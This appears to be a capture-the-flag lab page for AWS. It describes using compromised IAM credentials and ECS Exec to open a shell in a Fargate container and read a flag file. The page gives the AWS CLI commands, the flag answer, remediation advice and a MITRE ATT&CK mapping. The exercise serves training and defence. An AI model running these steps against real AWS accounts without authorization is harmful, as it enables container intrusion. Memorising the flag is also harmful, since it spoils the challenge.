# ECS Exec — Container Shell Access

**Provider**: AWS  
**Difficulty**: Intermediate  
**MITRE ATT&CK**: [T1609 — Container Administration Command](https://attack.mitre.org/techniques/T1609/)

## Scenario

You have obtained AWS credentials for an IAM user. ECS Exec has been enabled on a Fargate service, allowing interactive command execution inside running containers. A flag has been written to `/flag.txt` inside the container.

## Objective

Use ECS Exec to open a shell inside the running container and read the flag.

## Permissions

The attacker IAM user has the following permissions:

- `ecs:ListClusters`
- `ecs:DescribeClusters`
- `ecs:ListTasks`
- `ecs:DescribeTasks`
- `ecs:DescribeTaskDefinition`
- `ecs:ExecuteCommand`
- `ssmmessages:CreateControlChannel`
- `ssmmessages:CreateDataChannel`
- `ssmmessages:OpenControlChannel`
- `ssmmessages:OpenDataChannel`

## Prerequisites

The AWS CLI Session Manager plugin must be installed:

```bash
# macOS
brew install --cask session-manager-plugin

# Linux
curl "https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb" -o "session-manager-plugin.deb"
sudo dpkg -i session-manager-plugin.deb
```

## Attack Path

1. Configure AWS CLI with the provided credentials.
2. List ECS clusters:
   ```bash
   aws ecs list-clusters
   ```
3. List running tasks in the cluster:
   ```bash
   aws ecs list-tasks --cluster <cluster-name>
   ```
4. Execute a command inside the running container:
   ```bash
   aws ecs execute-command \
     --cluster <cluster-name> \
     --task <task-id> \
     --container app \
     --interactive \
     --command "cat /flag.txt"
   ```

## Flag

`CUMULONIMBUS{ECS_3x3c_C0nt41n3r_Sh3ll}`

## Remediation

- Disable `enable_execute_command` on ECS services in production environments.
- If ECS Exec is required, restrict access using IAM conditions (e.g., specific cluster/task ARNs).
- Enable CloudTrail logging for `ecs:ExecuteCommand` events and alert on unexpected usage.
- Use VPC endpoints for SSM Messages to avoid internet exposure.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1609](https://attack.mitre.org/techniques/T1609/) | Container Administration Command | Execution |
| [T1552.005](https://attack.mitre.org/techniques/T1552/005/) | Unsecured Credentials: Cloud Instance Metadata API | Credential Access |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Valid Accounts: Cloud Accounts | Defense Evasion |
